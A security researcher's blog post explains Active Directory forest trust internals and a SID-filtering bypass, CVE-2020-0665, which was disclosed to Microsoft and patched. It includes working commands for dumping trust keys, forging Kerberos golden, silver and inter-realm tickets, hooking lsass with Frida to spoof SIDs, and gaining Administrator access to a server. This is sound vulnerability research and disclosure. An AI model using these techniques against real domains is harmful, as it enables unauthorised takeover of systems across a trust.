---
layout: single
classes: wide
title:  "Active Directory forest trusts part 2 - Trust transitivity and finding a trust bypass"
date:   2021-06-10 20:08:57 +0200
---
In my first personal blog post in 2018 [I wrote](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/) about Active Directory forest trusts and how they work under the hood. Part two of the series was since then promised but never delivered. I researched this topic again in 2019 and ended up finding a logic flaw which allowed the bypassing of the SID filtering mechanism and compromise hosts in a trusted forest. This flaw was patched in February 2020 and given [CVE-2020-0665](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0665). Because of a global pandemic that cancelled most in-person conferences in 2020 I didn't really get around to talk about this much even though it is one of my favorite finds to date. Under the motto "better late than never", here is part 2 of the forest trust series, with the knowledge I've learned since then. Part of this content is also available as [video on my YouTube channel](https://www.youtube.com/watch?v=EUa7tyOOph4).

# Some important points
As mentioned in [my previous blog](https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/), this series is about trusts between different Active Directory forests. Unlike trusts in the same forest, which don't offer any security once one domain in the forest is compromised, trusts between different forests are not supposed to offer an attacker an easy way to compromise resources over trusts. For a while this "security boundary" was not present since [Will and Lee](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
) discovered a super neat attack based on Kerberos delegation, which was a "by design" feature until Microsoft decided to patch this and block this behaviour by default. That being said, in my experience forest trusts usually exists for a reason, and the reason is often to grant users from one domain privileges in a different domain. If those include administrative privileges, which is often the case, then it is usually possible to compromise hosts/domains in a trusting forest as well.

# Forging inter-realm tickets and Wireshark debugging

## Do you need to use inter-realm tickets?
Often when I see people trying to compromise domains over trusts and playing with Kerberos tickets they end up trying to forge inter-realm tickets. This is problematic because these tickets are not only tricky to create (lot of confusing parameters and SIDs), but they are also hard to use. For example impacket does not deal well with forged inter-realm tickets and using them with Mimikatz/Kekeo requires custom parameters. I think it's possible to use them with [Rubeus](https://github.com/GhostPack/Rubeus/tree/master/Rubeus), but that doesn't make the overall process less painful. What people often don't realize is that in most cases you **don't actually need** to create inter-realm tickets. If you're trying to access resources over a trust or escalate to enterprise admin in a single forest, in most cases it is sufficient to create a golden ticket with all the information from the domain you are already in, and then use this ticket to do the exploitation. Most tools handle this well and the Domain Controller you submit the golden ticket to will do the hard work of converting it into an inter-realm ticket that you can present to the DC in the other domain that you are trying to access. This can save you quite some debugging and potentially prevent headaches (though with Kerberos in general, YMMV).

## Which keys do I need for inter-realm tickets
If you are going down the route of inter-realm tickets, you should be aware of the different keys there are. For each trust, there is an incoming and outgoing trust key. These keys are based on the password in use for the trust, which is explored in [this blog](https://blog.xpnsec.com/inter-realm-key-roasting/) from Adam Chester. In the first 30 days the same password is used for both the incoming and the outgoing trust key. This means the RC4 keys, which do not contain a salt, are identical in the first 30 days. This makes it easy to dump the trust keys using for example secretsdump and look for the account which contains the domain name of the trusted domain. However, this only dumps the key for the outgoing trust, so after 30 days this key can't be used anymore for forging inter-realm tickets that will be accepted by the other forest, which requires the key of the incoming trust. Furthermore the Kerberos AES keys contain a salt which is different for the incoming and outgoing trust, so if you want to forge inter-realm tickets with AES keys, you would need to dump the actual trust keys and not only the keys dcsync will give you for the trust accounts. You can obtain the keys using Mimikatz, either by using `lsadump::trust /patch` on a Domain Controller, or by explicitly DCSyncing the TrustedDomain object, which can be done from any machine as long as you have the privileges. This requires the GUID of this object, which can be queried using PowerShell (or any other tool interacting with LDAP), after which you can use mimikatz to DCSync the keys with `lsadump::dcsync /guid{guid-here}`:

![Dumping trust keys with mimikatz](/assets/img/kerberos/trustpw_dcsync.png){: .align-center} 

Thanks to Benjamin (@gentilkiwi) for explaining this whole process to me back in 2019.

## Debugging Kerberos the easy way
In my previous post I wrote a custom script which decrypted the incoming Kerberos tickets to show the PAC. While this approach works it isn't really an easy way to view for example encrypted contents of tickets in Wireshark. Reading Adam's blog on Kerberos trust keys made me aware that Wireshark actually supports decrypting Kerberos exchanges if it has the correct keys in a keytab. Since I simply wanted a keyfile that I could dump as many keys in as possible, I searched for the binary file format and [wrote a small script](https://github.com/dirkjanm/forest-trust-tools/blob/master/keytab.py) that can create a keytab file from Kerberos keys. Using this script, we can add the `krbtgt` keys, the inter-realm trust keys, and the keys of any services we want to test to a keytab, load it in Wireshark and make the whole process much easier to follow.

![Configuring the generated keytab in Wireshark](/assets/img/foresttrusts/krb5wireshark.png){: .align-center} 

Now when I request a TGT we can see the decrypted ticket including the PAC in Wireshark:

![enc-part is now visible in Wireshark](/assets/img/foresttrusts/krbticket-decrypted.png){: .align-center} 

# Trust transitivity
So what exactly is trust transitivity? Most of the older documentation about trusts explains a transitive trust as:

> If domain A transitively trusts domain B, and domain B trusts domain C, then domain A implicitly trusts domain C

This is not wrong per-se, but it is important to note that this **only applies within the same forest**. If there are multiple (sub)domains, or tree roots in a single forest, then a trust between two parent domains also extends to any child domains. We previously already established though that within a single Active Directory forest, there is no security boundary and if one domain is compromised, all others can be compromised too, regardless of specific settings on trusts.

For the case that actually matters, such as a forest trust, this logic does not apply. If domain A, B and C are each in a separate forest, then if there is a trust between forest A and B, and between forest B and C, then forest A and C have no knowledge of each other and they can't authenticate with each other. Microsoft actually added some [documentation](https://docs.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust) on this, which clarifies this concept better than the documentation that was around when I was researching this topic.

![forests setup](/assets/img/foresttrusts/forestsetup.svg){: .align-center}

What this means that if we look at the picture above, forest A trusts forest B, and forest B trust forest C, but forest A does **not** trust forest C. In fact, forest A and forest C are not aware of each other. This will start making sense soon, but let us first look at the definition of trust transitivity in a forest trust.

A transitive trust means that forest B does not only trust forest A, but also all other domains than the forest root in forest A. So this includes the subdomain of forest A, and it would also include any sub-sub domains or even other domain trees, as long as they are part of the same forest A. But how does forest B know exactly which domains are part of forest A? It turns out that the information about the other forest is stored in the `TrustedDomain` object in forest B. This is a binary attribute that isn't parsed by the normal management GUI, but we can query it via LDAP:

![msDS-TrustForestTrustInfo attribute](/assets/img/foresttrusts/tdo_trustinfo.png){: .align-center}

The attribute is called `msDS-TrustForestTrustInfo`, which is a binary field described in [MS-ADTS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/96e44639-eb3e-48c3-a565-1d67cceb3bad) and contains structures for each domain in the forest.

I've made a [small script](https://github.com/dirkjanm/forest-trust-tools/blob/master/ftinfo.py) that parses this information, and it prints out the SIDs that it has stored for each domain in the forest (including the binary representation of that SID):

```
(forest-trust-tools) ➜  forest-trust-tools git:(master) ✗ python ftinfo.py
FOREST_TRUST_INFO
Version: {1}
Recordcount: {3}
Records: {[<__main__.FOREST_TRUST_INFO_RECORD object at 0x7f4110af4040>, <__main__.FOREST_TRUST_INFO_RECORD object at 0x7f4110afaac0>, <__main__.FOREST_TRUST_INFO_RECORD object at 0x7f4110afafa0>]}
Domain b'sub.forest-a.krbtgt.cloud' has SID S-1-5-21-1258691798-1044536029-2789180221
Domain b'sub.forest-a.krbtgt.cloud' has SID b'\x01\x04\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xd6\x1c\x06K\xddZB>=\x83?\xa6'
Domain b'forest-a.krbtgt.cloud' has SID S-1-5-21-4138248074-3154221552-1885830394
Domain b'forest-a.krbtgt.cloud' has SID b'\x01\x04\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\x8a\xa7\xa8\xf6\xf0\x99\x01\xbc\xfa|gp'
```

Above we see that Active Directory has a list of all the SIDs in the trusted forest. These SIDs are used using SID filtering. Any security identifier that is in the list of SIDs and part of an incoming ticket over the trust is accepted, all others are filtered out. If we apply this logic to the picture of forest A, B and C above, we see why "extended" transitivity is not a thing. Forest A and B each have a list of individual SIDs that are part of the other forest. Forest C does not have a trust with forest A, and neither is it aware of any SIDs of forest A. If a ticket from forest B with SIDs from forest A somehow ended up at forest C, all SIDs from forest A would be filtered out since forest C does not trust these. Therefor SID filtering prevents the hopping over trusts by only selectively accepting the SIDs that are on the trusted list.

# Trust transitivity - new domain discovery
At this point I wondered what would happen if a new domain was added to a trusted forest. If a new subdomain is added in forest A, will forest B automatically pick up the SID of that domain? And how often would it check such things? I shot a message to Sean Metcalf, who knows a lot about these kind of AD internals. Sean told me he wasn't sure about this part, but that such processes usually run every day on a Domain Controller. So I started Wireshark on the domain controller of forest B, added a new domain to forest A and waited a few days. And indeed, the new domain started appearing in the `msDS-TrustForestTrustInfo` all by itself. In my packet capture, I could see that it performed some NETLOGON operations, which indeed happened every 24 hours. It uses the Netlogon call `NetrGetForestTrustInformation`, which according to [MSDN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/63bab11c-a902-44a2-9cd7-221357788483) indeed returns the forest trust information in [LSA_FOREST_TRUST_RECORD](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/08cf1a65-ef7c-46d3-aa4d-558f5135df3d) format. I've implemented this call, that uses the incoming trust key to authenticate, in a [script](https://github.com/dirkjanm/forest-trust-tools/blob/master/gettrustinfo.py) that uses impacket:

```
python gettrustinfo.py forest-a/forest-b.krbtgt.cloud@forest-a-dc -hashes :8ef7d1bc6e961fd4ed085d6fd1e6ce10 -target-ip 51.144.50.171
Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation

[*] StringBinding ncacn_ip_tcp:51.144.50.171[49674]
NetrGetForestTrustInformationResponse 
ReturnAuthenticator:            
    Credential:                     
        Data:                            b'n\xfa\x82\xfc\xa8\x14\x9dV' 
    Timestamp:                       0 
ForestTrustInfo:                
    RecordCount:                     3 
    Entries:                        
        [
             
            Flags:                           0 
            ForestTrustType:                 ForestTrustTopLevelName 
            Time:                            0 
            ForestTrustData:                
                tag:                             0 
                TopLevelName:                    'forest-a.krbtgt.cloud' ,
             
            Flags:                           0 
            ForestTrustType:                 ForestTrustDomainInfo 
            Time:                            0 
            ForestTrustData:                
                tag:                             2 
                DomainInfo:                     
                    Sid:                            
                        Revision:                        1 
                        SubAuthorityCount:               4 
                        IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05' 
                        SubAuthority:                   
                            [
                                 21,
                                 4138248074,
                                 3154221552,
                                 1885830394,
                            ] 
                    DnsName:                         'forest-a.krbtgt.cloud' 
                    NetbiosName:                     'forest-a' ,

 ...snip...
        ] 
ErrorCode:                       0 

```

This script uses a special version of NETLOGON authentication, which authenticates using a trust account. For some reason the script is quite picky about using NETBIOS names versus FQDNs, and I've only gotten this to work using the NETBIOS name of the DC with the FQDN of the trust**ed** forest.

# Trust transitivity, adding our own SIDs to the trust
The above is quite interesting. If we have full control over everything that takes place in forest A, we could add arbitrary SIDs to the list of domains in forest A that forest B trusts. After all, that information is queried by forest B, but is constructed on a DC in forest A. This means we could in theory make forest B trust new domains and their respective SIDs. But how useful is this? After all, all the SIDs with some sort of privileges in forest B should already exist in forest B, and we can't add a SID that is already part of any domain in forest B. 

## How many domains are there in a domain?
The above knowledge sat with me for a while as I couldn't think of a logical attack avenue. Then I remembered some interesting observation I made when I was working on the Python version of BloodHound. When you ask an individual member server (or workstation) how many domains it trusts, it will say: 2. One is the Active Directory domain that the workstation or server is a part of, and one is the local "domain" that exists only on that machine and is stored in the SAM hive. This "domain" contains the local accounts and groups on the system, among which is the well known RID 500 account (the built-in `Administrator` account that is famously used for Pass the Hash attacks). Active Directory is not aware of all these local domains of the member systems, because it doesn't manage the local accounts on these systems. Every Active Directory domain will therefor contain as many "local" domains as there are systems joined to it.

## Do you trust this domain? [Y/n]
Next I wanted to find out if it was possible to use Kerberos authentication to fake the membership of this local domain. After all, the computer should not consider any SIDs from a PAC that is not part of Active Directory, but that belongs to the system itself. There is a relatively easy way to test this in a lab, by means of a silver ticket. A silver ticket is a rogue Kerberos ticket that is targeted specifically to a service or individual machine, and is encrypted with the Kerberos keys of the machine account. This is just for testing purposes, in the end the goal is to compromise the machine and have Active Directory create the ticket for us. So I've created a ticket without any special privileges, and used that with impacket's smbclient.py. 

```
~/impacket/examples/ticketer.py -domain forest-b.krbtgt.cloud -domain-sid S-1-5-21-2718814155-4002503294-3916132017 -spn cifs/forest-b-server.forest-b.krbtgt.cloud secretadmin -aesKey ab2dcf165f894395dadedd4a604f27ef252c1656d53cc46502a48663ed7ccbb8 -user-id 1000 -groups 513
```

Note that I use the user id 1000 and groups 513 (Domain Users) explicitly here because otherwise impacket will put Domain Admin SIDs in there by default.

When we try to list the `c$` directory, we see this doesn't work because we don't have admin privileges on this system:

![Access denied with low-privilege user](/assets/img/foresttrusts/lowprivdenied.png)

Now let's add the SID of the local administrator to our ticket, and see if this changes anything. Since this is a test I will query the SID of the local administrator in advance (we will get to how to do this later) from the system. This time, we do get access to the `C$` drive, indicating that the system recognizes us as local Administrator:

![Access denied with low-privilege user](/assets/img/foresttrusts/localsid.png)

What this means is that the computer accepted the ticket and all SIDs in it, even though one of the SIDs does not actually originate from Active Directory. The local account is not managed by Active Directory but the computer accepts it's usage in a Kerberos ticket nonetheless and grants us Administrator privileges.

## Designing a new forest trust attack
With this knowledge, we have a primitive to attack this computer from the other side of the trust. With full control over forest A we could perform the following steps:

* Fake a new domain in forest A that has the same SID as the local domain on a server in forest B.
* Wait for forest B to pick up the new SID and add it to the allowed SIDs.
* Create an inter-realm ticket that includes the SID of the local administrator account of the server in forest B, and give this to the DC in forest B.
* See if forest B gives us a ticket that includes the SID of the server in forest B
* Connect to the server in forest B server with our service ticket and enjoy administrative permissions.

One thing to note is that we require forest B to have at least one member server joined to it. We cannot target a Domain Controller here because while a Domain Controller has a local domain in SAM as well, it is only active during recovery mode and this is not really useful to us. But usually in each domain there are a few member servers that have Tier 0 privileges, such as AD Connect, ADFS, SCCM, Exchange etc.

# Executing the forest trust bypass
The pieces above describe the theoretical part of the trust bypass. To convert it into practice, we need to figure out two more things:

* A way to obtain the local SID of the server in forest B that we want to attack, using only credentials from forest A.
* Some practical way to "spoof" this SID as a new domain in forest A when forest B requests the domain information.

## Obtaining the local SID
On older versions of Windows 10 (or before Server 2016), we can use the SAMR RPC protocol to query local group memberships, which would give us the SID of the local administrator Account. This is the same technique BloodHound uses to enumerate Local Admin privileges, but it is restricted from Windows 10 version 1607 on and requires administrative privileges to enumerate. This is unfortunate because if we already have admin privileges on the server there is no further need to perform a cross-forest attack. I did some more digging into some RPC protocols and found one that should work for our purpose. [MS-LSAT](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsat/65d18faa-0cb2-40ee-a94a-2140212f4ec4) describes an RPC call that can be used to convert security principal names into SIDs using the `LsarLookupNames3` call.

![LsarLookupNames3 documentation](/assets/img/foresttrusts/lsarlookupnames.png){: .align-center}

I wrote a [small tool](https://github.com/dirkjanm/forest-trust-tools/blob/master/getlocalsid.py) which implements this call using impacket RPC code, using the `LsapLookupWksta` option to include the local workstation's database in the lookup. If we use this call and supply the NETBIOS name of the system we are targeting as a parameter, the system will resolve it to the local domain SID for the targeted system:

![resolving the remote SID using the getlocalsid script](/assets/img/foresttrusts/getlocalsid.png){: .align-center}

This can be executed as any authenticated user, which includes users that are from a trusted forest. As you can see on the screenshot above I used the credentials of a user in forest A against the target in forest B.

## Becoming a domain
![They told me I could become anything I wanted, so I became a domain](/assets/img/foresttrusts/soibecame.png){: .align-center}
(image ~~stolen~~ borrowed from @gentilkiwi and @mysmartlogon)

Now in order to make forest B accept our SID in tickets, we need to make it think there is a domain in forest A that has the SID of the server in forest B. There are a couple of methods I considered for doing this:

1. Add a new subdomain to Forest A by promoting a member server to a (new) DC and make sure generated SID matches local SID.
2. Modify the forest structure via LDAP to add the required objects that represent a subdomain manually.
3. Hook lsass.exe when the `NetrGetForestTrustInformation` is processed in Forest A and add an extra domain with the SID we want to target to the output list.
4. Hook lsass.exe when the `NetrGetForestTrustInformation` is processed in Forest A and replace the SID of an existing subdomain with the target SID.

Method 1 sounded quite impractical since I have no idea how a SID is generated when a new domain is added to a forest. Method 2 seemed possible but complicated since you'd have to manually create the naming context and use DCShadow to inject extra objects. Using DCShadow to add a new trusted domain object in forest A for a subdomain did not make that domain appear in the `NetrGetForestTrustInformation`, so this path was also abandoned.

Method 3 and 4 involve hooking lsass and intercepting the call when the `NetrGetForestTrustInformation` RPC call is actually made. In this scenario method 3 is the clean way because we add an extra structure to the output. However method 4 is simpler because we can do a sort of find/replace in memory on the SID of forest-a-sub.

So I did some reversing of the `NetrGetForestTrustInformation` call stack in lsass using x64dbg and went down the call stack to the part where the domains are processed:

![trust information in lsass](/assets/img/foresttrusts/lsasscallstack.png){: .align-center}

By following the execution we end up at some point with a call to `RtlLengthSid`. This is a great call to work with because according to [MSDN](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtllengthsid) this function accepts only one parameter, which is a pointer to the SID.

![Function call to rtllengthsid](/assets/img/foresttrusts/lsassrtllengthsid.png){: .align-center}

By following the address in the `rcx` register we do indeed end up at a piece of memory that contains the binary representation of the sid of forest-a-sub in memory:

![SID in memory](/assets/img/foresttrusts/lsasssidheap.png){: .align-center}

During the research I replaced the memory live in the debugger for the correct SID, however after preparing for my talk I decided to automate it using Frida:

![Intercepting with Frida](/assets/img/foresttrusts/fridaintercept.png){: .align-center}

What the script does is hook the `RtlLengthSid` function and look if this function returns to the hardcoded address of where the lookup is on the version of Server 2016 I was running here (if you want to run this on a different version you will have to calculate the offset using a reversing tool). If it is, then we are in the chain originating from the `NetrGetForestTrustInformation` call and we check if the SID being passed to this function is the one we want to replace. Because this SID is passed by reference, we can replace the memory this address points to with the SID of the server we want to attack, and this will end up in the object that is returned to the calling DC.

To test this, let us run the script again which gathers the SIDs using the `NetrGetForestTrustInformation` RPC call and the trust key. Before we start Frida, we see the regular SID as expected:

```
python gettrustinfo.py forest-a/forest-b.krbtgt.cloud@forest-a-dc -hashes :8ef7d1bc6e961fd4ed085d6fd1e6ce10 -target-ip 51.144.50.171
 ...snip...
ForestTrustData:                
    tag:                             2 
    DomainInfo:                     
        Sid:                            
            Revision:                        1 
            SubAuthorityCount:               4 
            IdentifierAuthority:             '\x00\x00\x00\x00\x00\x05' 
            SubAuthority:                   
                [
                     21,
                     1258691798,
                     1044536029,
                     2789180221,
                ] 
        DnsName:                         u'sub.forest-a.krbtgt.cloud' 
        NetbiosName:                     u'SUB' ,
 ...snip...
```

Now we start the [Frida script](https://github.com/dirkjanm/forest-trust-tools/blob/master/frida_intercept.py) as SYSTEM on the DC and run the call again:

![Intercepting with Frida](/assets/img/foresttrusts/fridaintercepted.png){: .align-center}

```
python gettrustinfo.py forest-a/forest-b.krbtgt.cloud@forest-a-dc -hashes :8ef7d1bc6e961fd4ed085d6fd1e6ce10 -target-ip 51.144.50.171
 ...snip...
DomainInfo:                     
    Sid:                            
        Revision:                        1 
        SubAuthorityCount:               4 
        IdentifierAuthority:             '\x00\x00\x00\x00\x00\x05' 
        SubAuthority:                   
            [
                 21,
                 2937342636,
                 164546242,
                 3042484607,
            ] 
    DnsName:                         u'sub.forest-a.krbtgt.cloud' 
    NetbiosName:                     u'SUB' ,
 ...snip...
```

Note that the SID (part of the `SubAuthority` field) changed to the SID of the server in forest B we want to attack, confirming our intereception is working.

### Executing the chain
Now we'd need to wait for forest B to query the new information and accept it. I know what you're thinking, why does changing the SID of an existing domain work? Turns out forest B does not care that the SID of a subdomain in forest A suddenly changed while the domain name remained the same, and happily overwrites this in it's database. If in a lab, you can actually speed up the process by logging in on the DC of forest B and saving the trust domains to a file, which will trigger an update.

![Saving the trust information to speed up the waiting](/assets/img/foresttrusts/save-sids.png){: .align-center}

On a side note, this information is not super useful because there is a bug here that parses the SIDs wrong and saves them as negative numbers (signed/unsigned integer cast bug), so you can't actually use those accurately. We do see the **164546242** component shown properly for the modified subdomain:

![Parsing integers is hard](/assets/img/foresttrusts/sidparsingfail.png){: .align-center}

We can go back to the forest trust information and see that it's updated:

![Updated forest trust info](/assets/img/foresttrusts/foresttrustinfoupdated.png){: .align-center}

![Updated forest trust info](/assets/img/foresttrusts/ftinfo-updated.png){: .align-center}

Note that this also shows the new SID properly, indicating that our SID is now actually trusted.

The last step is performing the forest trust bypass attack. We forge an inter-realm trust ticket, using once again the incoming trust key for the inter-realm ticket:

```
python ~/impacket/examples/ticketer.py -domain forest-a.krbtgt.cloud -domain-sid S-1-5-21-4138248074-3154221552-1885830394 -user-id 1000 -groups 513 -extra-sid S-1-5-21-2937342636-164546242-3042484607-500 -spn krbtgt/FOREST-B.KRBTGT.CLOUD -aesKey 0bd61f335bcb7fb66ac0b06b0b2208e7e94597da8d2de102cbc88cd01b2cc03c fakeuser

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for forest-a.krbtgt.cloud/fakeuser
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in fakeuser.ccache
```

With the modified `getftST.py` from my forest-trust-tools (which includes our trust keys) we then request a service ticket for the server in forest B:

```
KRB5CCNAME=fakeuser.ccache python getftST.py -spn cifs/forest-b-server.forest-b.krbtgt.cloud -target-domain forest-b.krbtgt.cloud -via-domain forest-a.krbtgt.cloud test/test -debug -dc-ip forest-b-dc.forest-b.krbtgt.cloud
```

This gives a lot of debug info, but the important part is that the extra SIDs are included in the service ticket:

```
ExtraSids:                      
    [
         
        Sid:                            
            Revision:                        1 
            SubAuthorityCount:               5 
            IdentifierAuthority:             b'\x00\x00\x00\x00\x00\x05' 
            SubAuthority:                   
                [
                     21,
                     2937342636,
                     164546242,
                     3042484607,
                     500,
                ] 
        Attributes:                      7 ,
    ] 
```

This is also visible in Wireshark (provided we have the AES key of the computer account of server B loaded for debugging):

![Extra SIDs visible in the TGS-REP in Wireshark](/assets/img/foresttrusts/extrasids-wireshark.png){: .align-center}

The final step is to use this ticket against the server in forest B and note that we became an Administrator there (which is visible because we can list the C:\ drive which is ADMIN only):

```
KRB5CCNAME=test.ccache python ~/impacket/examples/smbclient.py -k forest-a.krbtgt.cloud/fakeuser@forest-b-server.forest-b.krbtgt.cloud -no-pass 
Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation

Type help for list of commands
# use C$
# ls
drw-rw-rw-          0  Mon Aug 17 03:45:45 2020 $Recycle.Bin
-rw-rw-rw-     389408  Wed Dec  4 21:28:06 2019 bootmgr
-rw-rw-rw-          1  Wed Dec  4 21:28:06 2019 BOOTNXT
drw-rw-rw-          0  Wed Dec  4 21:44:12 2019 Documents and Settings
drw-rw-rw-          0  Thu Jun 10 11:40:01 2021 Packages
drw-rw-rw-          0  Wed Dec  4 21:37:36 2019 PerfLogs
drw-rw-rw-          0  Wed Dec  4 21:37:36 2019 Program Files
drw-rw-rw-          0  Wed Dec  4 21:37:36 2019 Program Files (x86)
drw-rw-rw-          0  Mon Aug 17 09:35:12 2020 ProgramData
drw-rw-rw-          0  Wed Dec  4 21:44:13 2019 Recovery
drw-rw-rw-          0  Wed Aug 19 01:32:33 2020 System Volume Information
drw-rw-rw-          0  Mon Aug 17 03:44:52 2020 Users
drw-rw-rw-          0  Mon Aug 17 01:46:32 2020 Windows
drw-rw-rw-          0  Thu Jun 10 11:40:01 2021 WindowsAzure
# 
```

Here is a demo of the same attack using mimikatz and kekeo:

<video width="100%" controls>
   <source src="/assets/raw/kekeodemo.mp4" type="video/mp4">
</video> 

As I mentioned earlier in this blog, in most cases you actually won't need to forge an inter-realm trust ticket. The same holds for this case, we can also create a golden ticket with only the SID of the spoofed server as extra SID, and let impacket handle the referrals. The only caveat in this case is that you'll need to make sure the A records of the different forests resolve to the respective domain controllers, because impacket can only specify one DC IP, which breaks when following referrals.

Creating the golden ticket with the AES key of the krbtgt account in forest A: 

```
python ~/impacket/examples/ticketer.py -domain forest-a.krbtgt.cloud -domain-sid S-1-5-21-4138248074-3154221552-1885830394 -user-id 1000 -groups 513 -extra-sid S-1-5-21-2937342636-164546242-3042484607-500 -aesKey 68a604fea66cd26afbe34eb49cda1a792c9fd697d627329a52ce79231d452176 superuser
Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for forest-a.krbtgt.cloud/superuser
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in superuser.ccache
```

Using the golden ticket:

```
KRB5CCNAME=superuser.ccache python ~/impacket/examples/smbclient.py -k forest-a.krbtgt.cloud/superuser@forest-b-server.forest-b.krbtgt.cloud -no-pass  -debug
Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation

[+] Impacket Library Installation Path: /home/user/impacket/impacket
[+] Using Kerberos Cache: superuser.ccache
[+] SPN CIFS/FOREST-B-SERVER.FOREST-B.KRBTGT.CLOUD@FOREST-A.KRBTGT.CLOUD not found in cache
[+] AnySPN is True, looking for another suitable SPN
[+] Returning cached credential for KRBTGT/FOREST-A.KRBTGT.CLOUD@FOREST-A.KRBTGT.CLOUD
[+] Using TGT from cache
[+] Trying to connect to KDC at FOREST-A.KRBTGT.CLOUD
[+] Trying to connect to KDC at FOREST-B.KRBTGT.CLOUD
Type help for list of commands
# use C$
# ls
drw-rw-rw-          0  Mon Aug 17 03:45:45 2020 $Recycle.Bin
-rw-rw-rw-     389408  Wed Dec  4 21:28:06 2019 bootmgr
-rw-rw-rw-          1  Wed Dec  4 21:28:06 2019 BOOTNXT
drw-rw-rw-          0  Wed Dec  4 21:44:12 2019 Documents and Settings
drw-rw-rw-          0  Thu Jun 10 11:40:01 2021 Packages
drw-rw-rw-          0  Wed Dec  4 21:37:36 2019 PerfLogs
drw-rw-rw-          0  Wed Dec  4 21:37:36 2019 Program Files
drw-rw-rw-          0  Wed Dec  4 21:37:36 2019 Program Files (x86)
drw-rw-rw-          0  Mon Aug 17 09:35:12 2020 ProgramData
drw-rw-rw-          0  Wed Dec  4 21:44:13 2019 Recovery
drw-rw-rw-          0  Wed Aug 19 01:32:33 2020 System Volume Information
drw-rw-rw-          0  Mon Aug 17 03:44:52 2020 Users
drw-rw-rw-          0  Mon Aug 17 01:46:32 2020 Windows
drw-rw-rw-          0  Thu Jun 10 11:40:01 2021 WindowsAzure
# 
```

This last attack is also likely easier to automate using mimikatz/kekeo or Rubeus.

# Disclosure and patch notes
This attack was disclosed to MSRC in October 2019, and a patch was issued in February 2020. The patch updates Windows hosts to refuse SIDs in Kerberos service tickets that are local to it's own domain. Attempting to authenticate with a ticket containing such a local SID will cause an event with ID `4675` to be raised on the victim server/workstation. This event ID is documented as being only applicable to Domain Controllers, but after this patch it can trigger on workstations and servers as well. The event log will also indicate which SID was filtered, which in this case will be the local Administrator user (in my case this is renamed to Superuser, but this will commonly say `servername\Administrator`):

![Event log showing a filtered SID on a server](/assets/img/foresttrusts/sidwasfiltered.png){: .align-center}

The vulnerability was assigned [CVE-2020-0665](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0665).

As a closing note: though this vulnerability is now patched, using a forest trust still implies that you trust the forest on the other side of the trust. If this other forest is compromised, chances are that the compromise can be extended over the trust as well, either through permissions granted cross-forest, password reuse, or through another vulnerability in the trust handling.